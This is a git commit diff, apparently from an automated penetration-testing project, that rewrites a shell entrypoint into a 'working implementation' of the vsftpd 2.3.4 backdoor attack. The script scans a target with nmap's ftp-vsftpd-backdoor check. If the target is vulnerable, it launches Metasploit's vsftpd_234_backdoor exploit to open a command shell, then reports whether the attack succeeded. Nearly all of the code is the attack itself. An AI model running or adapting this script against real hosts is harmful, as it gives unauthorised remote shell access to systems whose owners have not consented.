3c4f9037e11674f44c72c03932be360b5d6f5e4d
BernhardSchuld <bernhardschuld@gmail.com>
2018-10-11 00:02:00 +0200

    :sparkles:(vsftpd-backdoor): Working implementation of vsftpd-backdoor
    Signed-off-by: BernhardSchuld <bernhardschuld@gmail.com>

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,18 +1,19 @@
-# echo "Checking if $TARGET is vulnerable to vsftp-backdoor"
-# nmap --script ftp-vsftpd-backdoor $TARGET | grep 'VULNERABLE' &> /dev/null;
-# if [ $? == 0 ]; then
-   # echo "$TARGET:$PORT is vulnerable to vsftp-backdoor. Executing attack"
-   echo 'exit' | msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost $TARGET; run" | grep -E 'Command shell session | UID: | Exploit completed' >> output.txt
+echo "REPORT: Checking if $TARGET is vulnerable to vsftp-backdoor"
+nmap --script ftp-vsftpd-backdoor $TARGET | grep 'VULNERABLE' &> /dev/null;
+if [ $? == 0 ]; then
+   echo "REPORT: $TARGET is vulnerable to vsftp-backdoor. Executing attack"
+   echo 'exit' | msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost $TARGET; run" | grep -E 'Command shell session | Exploit completed' >> output.txt
    while read line; do
      arr=( "${arr[@]}" "$line" )
    done < output.txt
 
-   echo ${arr[0]}
-   echo ${arr[1]}
-   echo ${arr[2]}
-   echo ${arr[3]}
-# else
-#   echo "$TARGET is not vulnerable to vsftp-backdoor"
-# fi
+   if [[ ${arr[1]} == *"Command shell session"* ]]; then
+     echo "REPORT: VSFTPD Backdoor succeeded on $TARGET"
+   elif [[ ${arr[0]} == *"Exploit completed, but no session was created."* ]]; then
+     echo "REPORT: VSFTPD Backdoor on $TARGET could not be exploited"
+   fi
+else
+  echo "REPORT: $TARGET is not vulnerable to vsftp-backdoor"
+fi
 
 exec "$@"
